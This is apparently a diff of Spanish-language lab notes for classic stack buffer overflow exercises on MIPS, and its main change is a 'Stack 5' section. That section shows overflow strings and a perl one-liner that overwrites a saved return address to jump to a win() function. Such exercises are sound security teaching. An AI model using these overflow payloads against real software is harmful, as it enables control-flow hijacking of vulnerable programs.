@@ -1,5 +1,6 @@
 Copiar los códigos a MIPS.
 Compilar en MIPS:	gcc -Wall -O0 stack.c
+			gcc -Wall -O0 -S -mrnames stack5.c
 A stack1.c mandarle los 84 caracteres:	00000000000000000000000000000000000000000000000000000000000000000000000000000000DCBA
 
 echo 00000000000000000000000000000000000000000000000000000000000000000000000000000000DCBA| ./a.out
@@ -47,53 +48,13 @@ Nota 2: Se imprimen 96 caracteres para llegar hasta el $ra de la función stack4
 	16 para pisar gp y fp y quedar en el $ra
 
 
+Stack 5
+stack5.c es sólo una función. Entonces necesita un programa main.c que la llame. 
+Pero dicho programa además tiene otra función, win() creada arbitrariamente, que es a la que quiero saltar. Su dirección es 00400ca4
+Entonces con el input del gets piso el $ra de stack5() y en vez de evaluar el if de la cookie y volver al main() salto a win()
 
-$LC2:
-        .ascii  "you win!\n\000"
-        .text
-        .align  2
-        .globl  stack4
-        .ent    stack4
-	la      $a0,$LC2
-	la      $t9,printf
-
-
-
-
-
-
-
-.file   1 "stack4.c"
-        .section .mdebug.abi32
-        .previous
-        .abicalls
-        .text
-        .align  2
-        .globl  main
-        .ent    main
-main:
-        .frame  $fp,40,$ra              # vars= 0, regs= 3/0, args= 16, extra= 8
-        .mask   0xd0000000,-8
-        .fmask  0x00000000,0
-        .set    noreorder
-        .cpload $t9
-        .set    reorder
-               la      $a0,$LC2
-        la      $t9,printf
-        jal     $ra,$t9
-        j       $ra
-        .end    main
-        .size   main, .-main
-        .rdata       
-        .align  2
-$LC2:
-        .ascii  "you win!\n\000"
-        .text
-        .ident  "GCC: (GNU) 3.3.3 (NetBSD nb3 20040520)"
-
-
-
-
+00 40 0c a4
+perl -e 'print "a"x96 . "\xa4\x0c\x40\x00"' | ./a.out
 
 
 
